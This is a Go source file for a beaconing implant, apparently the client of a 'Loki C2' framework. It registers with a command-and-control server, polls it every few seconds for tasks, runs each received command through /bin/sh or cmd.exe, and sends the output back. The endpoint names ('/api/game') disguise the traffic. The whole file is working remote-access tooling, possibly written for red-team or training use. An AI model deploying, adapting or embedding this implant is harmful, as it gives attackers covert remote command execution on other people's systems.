// Copyright 2018 Kris Howard. All rights reserved.
// Use of this source code is governed by a license
// that can be found in the LICENSE file.

// Serve as a client to the Loki C2
package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

var cuid string
var key string
var register = "/api/game/login"
var taskboard = "/api/game"
var apiRoot string
var beaconTime int
var commandHint string
var commandArgZero string

// Setup main connection
func main() {
	//apiroot = os.Args[1]
	//beacontime = os.Args[2]
	apiRoot = "http://localhost:6543"
	beaconTime = 5

	// Determine operating environment
	// TODO consider iterating through all `runtime.GOOS` options
	if _, err := os.Stat("/bin/sh"); err == nil {
		commandHint = "/bin/sh"
		commandArgZero = "-c"
	} else if runtime.GOOS == "windows" {
		commandHint = "cmd.exe"
		commandArgZero = "/C"
	}
	// Get keys
	var keys map[string]interface{}
	response, err := http.PostForm(apiRoot+register, url.Values{"ehlo": {commandHint}})

	if err != nil {
		fmt.Printf("The HTTP request failed with error %s\n", err)
	} else {
		data, _ := ioutil.ReadAll(response.Body)
		json.Unmarshal([]byte(data), &keys)
	}
	// Assign these to global so they can easily be accessed everywhere
	cuid = keys["cuid"].(string)
	key = keys["key"].(string)
	fmt.Println("cuid: " + cuid + " key: " + key)
	// Monitor for tasks
	taskLoop()
}

func taskLoop() {
	// no need for timing out, but this can be a different case
	// timeout := time.After(5 * time.Second)
	tick := time.Tick(time.Duration(beaconTime) * time.Second)

	for {
		select {
		case <-tick:
			task, ok := getTask()
			if ok {
				tuid := task["tuid"].(string)
				request := task["cmd"].(string)
				fmt.Println("Got Task:" + tuid)
				cmdOut := runCmd(10, request)
				fmt.Println("Executed command: " + request)
				sendResult(tuid, cmdOut)
				fmt.Println("Sent command results to C2")
			}
		}
	}
}

// Gets a task from the server if available
// Returns unmarshalled JSON, and a success bool
func getTask() (map[string]interface{}, bool) {
	var client = &http.Client{
		Timeout: time.Second * time.Duration(10),
	}
	data := strings.NewReader(url.Values{"cuid": {cuid}, "key": {key}}.Encode())
	r, _ := http.NewRequest(http.MethodPost, apiRoot+taskboard, data)
	// Close the resources when getTask() finishes
	response, err := client.Do(r)
	if err != nil {
		println("error encountered:" + err.Error())
		return nil, false
	}
	defer response.Body.Close()
	// Server gives us an `204 No Content`` if no tasks available
	if response.StatusCode == 204 {
		return nil, false
	} else if response.StatusCode == 200 {
		data, _ := ioutil.ReadAll(response.Body)
		var task map[string]interface{}
		json.Unmarshal([]byte(data), &task)
		return task, true
	}
	return nil, false
}

func runCmd(timeout int, request string) string {
	// instantiate new command
	cmd := exec.Command(commandHint, commandArgZero, request)

	// get pipes
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		return "cmd.StdoutPipe() error: " + err.Error()
	}

	// start process
	if err := cmd.Start(); err != nil {
		return "cmd.Start() error: " + err.Error()
	}

	// setup a buffer to capture standard output
	var buf bytes.Buffer

	// create a channel to capture any errors from wait
	done := make(chan error)
	go func() {
		if _, err := buf.ReadFrom(stdout); err != nil {
			panic("buf.Read(stdout) error: " + err.Error())
		}
		done <- cmd.Wait()
	}()

	// run the command, timing out after timeout while still getting results
	select {
	case <-time.After(time.Duration(timeout) * time.Second):
		if err := cmd.Process.Kill(); err != nil {
			return "Timeout Reached, Failed to Kill:\n" + err.Error()
		}
		return "Timeout Reached:\n" + buf.String()
	case err := <-done:
		if err != nil {
			close(done)
			return "Error Occurred:\n" + err.Error()
		}
		return "Process Complete:\n" + buf.String()
	}
}

func sendResult(tuid string, result string) bool {
	var client = &http.Client{
		Timeout: time.Second * time.Duration(10),
	}
	data := strings.NewReader(url.Values{"cuid": {cuid}, "key": {key}, "tuid": {tuid}, "data": {result}}.Encode())
	r, _ := http.NewRequest(http.MethodPut, apiRoot+taskboard, data)
	r.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	response, err := client.Do(r)
	if err != nil {
		println("error encountered when putting: " + err.Error())
	}
	defer response.Body.Close()
	if response.StatusCode == 200 {
		return true
	}
	return false
}